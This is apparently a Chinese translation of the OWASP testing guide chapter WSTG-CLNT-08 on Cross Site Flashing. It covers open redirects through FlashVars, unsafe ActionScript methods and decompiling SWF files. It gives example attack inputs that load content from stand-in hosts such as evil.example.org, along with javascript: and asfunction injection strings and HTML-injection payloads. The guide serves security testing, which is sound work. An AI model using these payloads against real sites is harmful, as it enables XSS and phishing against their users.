# 测试跨站 Flash 攻击

|ID          |
|------------|
|WSTG-CLNT-08|

## 概述

ActionScript 基于 ECMAScript，是 Flash 应用程序在处理交互式需求时使用的语言。ActionScript 语言有三个版本。ActionScript 1.0 和 ActionScript 2.0 非常相似，ActionScript 2.0 是 ActionScript 1.0 的扩展。ActionScript 3.0 随 Flash Player 9 引入，是对语言的重写，以支持面向对象设计。

ActionScript 与其他语言一样，存在一些可能导致安全问题的实现模式。特别是，由于 Flash 应用程序通常嵌入在浏览器中，存在缺陷的 Flash 应用程序中可能存在基于 DOM 的跨站脚本（DOM XSS）等漏洞。

跨站 Flash（XSF）是一种影响类似于 XSS 的漏洞。

当以下场景从不同域发起时，就会发生 XSF：

- 一个影片通过 `loadMovie*` 函数（或其他方法）加载另一个影片，并且可以访问相同或部分相同的沙盒。
- 一个 HTML 页面使用 JavaScript 控制 Adobe Flash 影片，例如通过调用：
    - `GetVariable` 以字符串形式访问 Flash 公共和静态对象。
    - `SetVariable` 使用 JavaScript 将静态或公共 Flash 对象设置为新的字符串值。
- 浏览器与 SWF 应用程序之间的意外通信，可能导致从 SWF 应用程序窃取数据。

XSF 可以通过强制存在缺陷的 SWF 加载外部恶意 Flash 文件来实现。此攻击可能导致 XSS，或修改 GUI 以欺骗用户在虚假 Flash 表单中输入凭据。当使用 `loadMovie*` 方法且存在 Flash HTML 注入或外部 SWF 文件时，可能会使用 XSF。

### 开放重定向器

SWF 具有导航浏览器的能力。如果 SWF 将目标作为 FlashVar 接收，则该 SWF 可能被用作开放重定向器。开放重定向器是指受信任网站上任何可由攻击者用来将最终用户重定向到恶意网站的功能片段。这些通常用于钓鱼攻击。与跨站脚本类似，攻击涉及用户点击恶意链接。

在 Flash 的情况下，恶意 URL 可能如下所示：

```text
https://trusted.example.org/trusted.swf?getURLValue=https://www.evil-spoofing-website.org/phishEndUsers.html
```

在上面的示例中，最终用户可能会看到 URL 以他们最喜欢的受信任网站开头，并点击它。该链接将加载受信任的 SWF，该 SWF 获取 `getURLValue` 并将其提供给 ActionScript 浏览器导航调用：

```actionscript
getURL(_root.getURLValue,"_self");
```

这将导航浏览器到攻击者提供的恶意 URL。此时，钓鱼者已成功利用用户对 trusted.example.org 的信任，诱骗用户访问其恶意网站。从那里，他们可以发起零日攻击、对原始网站进行欺骗或任何其他类型的攻击。SWF 可能无意中充当网站上的开放重定向器。

开发人员应避免将完整 URL 作为 FlashVars。如果他们仅计划在其自己网站内导航，则应使用相对 URL 或验证 URL 以受信任的域和协议开头。

### 攻击与 Flash Player 版本

自 2007 年 5 月以来，Adobe 发布了三个新版本的 Flash Player。每个新版本都限制了之前描述的部分攻击。

| Player 版本 | `asfunction` | ExternalInterface | GetURL | HTML 注入 |
|----------------|--------------|-------------------|--------|----------------|
| v9.0 r47/48    |  是          |   是              | 是     |     是        |
| v9.0 r115      |  否          |   是              | 是     |     是        |
| v9.0 r124      |  否          |   是              | 是     |  部分      |

## 测试目标

- 反编译并分析应用程序的代码。
- 评估接收器输入和不安全方法的使用情况。

## 如何测试

自“测试 Flash 应用程序”首次发布以来，为了缓解将要描述的部分攻击，发布了新版本的 Flash Player。然而，由于不安全的编程实践，一些问题仍然可以被利用。

### 反编译

由于 SWF 文件由播放器中嵌入的虚拟机解释，因此它们可以被反编译和分析。最知名且免费的 ActionScript 2.0 反编译器是 flare。

要使用 flare 反编译 SWF 文件，只需输入：

`$ flare hello.swf`

这将生成一个名为 hello.flr 的新文件。

反编译对测试人员很有帮助，因为它允许对 Flash 应用程序进行白盒测试。快速网络搜索可以找到各种反汇编程序和 Flash 安全工具。

### 未定义变量 FlashVars

FlashVars 是 SWF 开发人员预期从网页接收的变量。FlashVars 通常通过 HTML 中的 Object 或 Embed 标签传递。例如：

```html
<object width="550" height="400" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"
codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,124,0">
    <param name="movie" value="somefilename.swf">
    <param name="FlashVars" value="var1=val1&var2=val2">
    <embed src="somefilename.swf" width="550" height="400" FlashVars="var1=val1&var2=val2">
</embed>
</object>
```

FlashVars 也可以从 URL 初始化：

`https://www.example.org/somefilename.swf?var1=val1&var2=val2`

在 ActionScript 3.0 中，开发人员必须将 FlashVar 值显式分配给局部变量。通常看起来像这样：

```actionscript
var paramObj:Object = LoaderInfo(this.root.loaderInfo).parameters;
var var1:String = String(paramObj["var1"]);
var var2:String = String(paramObj["var2"]);
```

在 ActionScript 2.0 中，任何未初始化的全局变量都被假定为 FlashVar。全局变量是那些以 `_root`、`_global` 或 `_level0` 为前缀的变量。这意味着如果在整个代码流中某个属性（如 `_root.varname`）未定义，则它可能被 URL 参数覆盖：

`https://victim/file.swf?varname=value`

无论您查看的是 ActionScript 2.0 还是 ActionScript 3.0，FlashVars 都可能成为攻击向量。让我们看一些易受攻击的 ActionScript 2.0 代码：

示例：

```actionscript
movieClip 328 __Packages.Locale {

#initclip
    if (!_global.Locale) {
    var v1 = function (on_load) {
        var v5 = new XML();
        var v6 = this;
        v5.onLoad = function (success) {
        if (success) {
            trace('Locale loaded xml');
            var v3 = this.xliff.file.body.$trans_unit;
            var v2 = 0;
            while (v2 < v3.length) {
            Locale.strings[v3[v2]._resname] = v3[v2].source.__text;

        if (_root.language != undefined) {

        v5.load(Locale.DEFAULT_LANG + '/player_' +
                            Locale.DEFAULT_LANG + '.xml');

```

上述代码可能通过请求以下内容受到攻击：

`https://victim/file.swf?language=https://evil.example.org/malicious.xml?`

### 不安全的方法

当识别出入点时，其表示的数据可能被不安全的方法使用。如果数据未经过滤或验证，可能导致一些漏洞。

自 r47 版本以来的不安全方法包括：

- `loadVariables()`
- `loadMovie()`
- `getURL()`
- `loadMovie()`
- `loadMovieNum()`
- `FScrollPane.loadScrollContent()`
- `LoadVars.load`
- `LoadVars.send`
- `XML.load( 'url' )`
- `LoadVars.load( 'url' )`
- `Sound.loadSound( 'url' , isStreaming );`
- `NetStream.play( 'url' );`
- `flash.external.ExternalInterface.call(_root.callback)`
- `htmlText`

### 通过反射型 XSS 进行利用

SWF 文件应托管在受害者的主机上，并且必须使用反射型 XSS 技术。攻击者强制浏览器直接在地址栏中加载纯 SWF 文件（通过重定向或社会工程），或通过来自恶意页面的 iframe 加载它：

```html
<iframe src='https://victim/path/to/file.swf'></iframe>
```

在这种情况下，浏览器将自行生成一个 HTML 页面，就好像它托管在受害者主机上一样。

### GetURL (AS2) / NavigateToURL (AS3)

ActionScript 2.0 中的 GetURL 函数和 ActionScript 3.0 中的 NavigateToURL 函数允许影片将 URI 加载到浏览器窗口中。如果未定义变量用作 getURL 的第一个参数：

`getURL(_root.URI,'_targetFrame');`

或者，如果 FlashVar 用作传递给 navigateToURL 函数的参数：

```actionscript
var request:URLRequest = new URLRequest(FlashVarSuppliedURL);
navigateToURL(request);
```

那么这意味着可以通过请求以下内容在托管影片的同一域中调用 JavaScript：

`https://victim/file.swf?URI=javascript:evilcode`

`getURL('javascript:evilcode','_self');`

当仅通过 DOM 注入（Flash JavaScript 注入）控制 `getURL` 的部分时，同样可能：

```js
getUrl('javascript:function('+_root.arg+')')
```

### 使用 `asfunction`

您可以使用特殊的 `asfunction` 协议，使链接执行 SWF 文件中的 ActionScript 函数，而不是打开 URL。直到 Flash Player 9 r48 发布之前，`asfunction` 可用于任何将 URL 作为参数的方法。在该版本之后，`asfunction` 被限制在 HTML TextField 中使用。

这意味着测试人员可以尝试在每个不安全方法中注入：

```actionscript
asfunction:getURL,javascript:evilcode
```

例如，在：

```actionscript
loadMovie(_root.URL)
```

中通过请求：

`https://victim/file.swf?URL=asfunction:getURL,javascript:evilcode`

### ExternalInterface

`ExternalInterface.call` 是 Adobe 引入的静态方法，用于改善 ActionScript 2.0 和 ActionScript 3.0 的播放器/浏览器交互。

从安全角度来看，当其部分参数可被控制时，它可能被滥用：

```actionscript
flash.external.ExternalInterface.call(_root.callback);
```

此类缺陷的攻击模式可能类似于：

```js
eval(evilcode)
```

因为浏览器执行的内部 JavaScript 将类似于：

```js
eval('try { __flash__toXML('+__root.callback+') ; } catch (e) { "<undefined/>"; }')
```

### HTML 注入

TextField 对象可以通过设置以下内容呈现最小 HTML：

```actionscript
tf.html = true
tf.htmlText = '<tag>text</tag>'
```

因此，如果部分文本可由测试人员控制，则可以注入 `<a>` 标签或图像标签，从而修改 GUI 或对浏览器发起 XSS 攻击。

使用 `<a>` 标签的一些攻击示例：

- 直接 XSS：`<a href='javascript:alert(123)'>`
- 调用函数：`<a href='asfunction:function,arg'>`
- 调用 SWF 公共函数：`<a href='asfunction:_root.obj.function, arg'>`
- 调用原生静态函数：`<a href='asfunction:System.Security.allowDomain,evilhost'>`

图像标签也可使用：

```html
<img src='https://evil/evil.swf'>
```

在此示例中，`.swf` 是必需的，以绕过 Flash Player 内部过滤器：

```html
<img src='javascript:evilcode//.swf'>
```

自 Flash Player 9.0.124.0 发布以来，XSS 不再可利用，但 GUI 修改仍可实现。

以下工具可能有助于处理 SWF：

- [OWASP SWFIntruder](https://wiki.owasp.org/index.php/Category:SWFIntruder)
- [反汇编器 – Flasm](https://flasm.sourceforge.net/)
- [Swfmill – 将 Swf 转换为 XML 及反向转换](https://www.swfmill.org/)
